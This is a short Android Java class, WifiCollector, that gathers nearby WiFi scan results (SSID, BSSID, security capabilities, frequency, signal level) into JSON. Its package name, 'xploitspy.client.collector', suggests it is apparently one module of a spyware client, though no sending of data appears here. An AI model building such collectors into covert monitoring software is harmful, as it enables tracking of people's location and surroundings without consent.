package com.xploitspy.client.collector;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

/**
 * WifiCollector - Mengumpulkan data WiFi Networks
 */
public class WifiCollector {
    
    private static final String TAG = "WifiCollector";
    private Context context;
    private WifiManager wifiManager;
    
    public WifiCollector(Context context) {
        this.context = context;
        this.wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
    }
    
    public JSONArray collect() {
        JSONArray networks = new JSONArray();
        
        try {
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                List<ScanResult> scanResults = wifiManager.getScanResults();
                
                for (ScanResult result : scanResults) {
                    JSONObject network = new JSONObject();
                    network.put("ssid", result.SSID);
                    network.put("bssid", result.BSSID);
                    network.put("capabilities", result.capabilities);
                    network.put("frequency", result.frequency);
                    network.put("level", result.level);
                    
                    networks.put(network);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting WiFi networks", e);
        }
        
        return networks;
    }
}

